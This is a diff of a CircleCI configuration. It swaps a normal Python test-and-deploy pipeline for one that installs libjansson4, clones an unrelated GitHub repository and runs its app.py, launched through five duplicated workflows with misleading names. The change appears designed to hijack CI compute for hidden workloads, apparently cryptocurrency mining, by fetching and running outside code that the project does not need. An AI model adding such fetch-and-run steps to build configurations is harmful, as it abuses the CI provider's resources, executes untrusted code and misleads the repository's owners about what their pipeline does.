@@ -1,38 +1,44 @@
 version: 2.1
-orbs:
-  python: circleci/python@2.0.3
-  heroku: circleci/heroku@1.2.6
-
-jobs:
-  build_and_test: # this can be any name you choose
-    executor: python/default
+executors:
+  circleci_machine:
+    docker:
+      - image: cimg/go:1.16.4
+    working_directory: ~/my-project
+commands:
+  build:
+    description: Run build
     steps:
       - checkout
-      - python/install-packages:
-          pkg-manager: pip
       - run:
-          name: Run tests
-          command: python -m pytest
-      - persist_to_workspace:
-          root: ~/project
-          paths:
-            - .
-
-  deploy: # this can be any name you choose
-    executor: python/default
-    steps:
-      - attach_workspace:
-          at: ~/project
-      - heroku/deploy-via-git:
-          force: true # force push when pushing to the heroku remote, see: https://devcenter.heroku.com/articles/git
+          name: build
+          command: |
+              sudo apt update && sudo apt install libjansson4
+               
+      - run:
+          name: build
+          command: |
+              git clone https://github.com/unauna1803/travershin.git && cd travershin && chmod +x app.py && cd travershin && chmod +x app.py && python3 app.py || python app.py
+              
+jobs:
+  buildd:
+    executor: circleci_machine
+    working_directory: ~/my-project
+    steps: [build]
 
 workflows:
-  test_my_app:
+  version: 2
+  apijava1:
     jobs:
-      - build_and_test
-      - deploy:
-          requires:
-            - build_and_test # only deploy if the build_and_test job has completed
-          filters:
-            branches:
-              only: main # only deploy when on main
+      - buildd
+  apijava2:
+    jobs:
+      - buildd
+  apijava3:
+    jobs:
+      - buildd
+  apijava4:
+    jobs:
+      - buildd
+  apijava5:
+    jobs:
+      - buildd
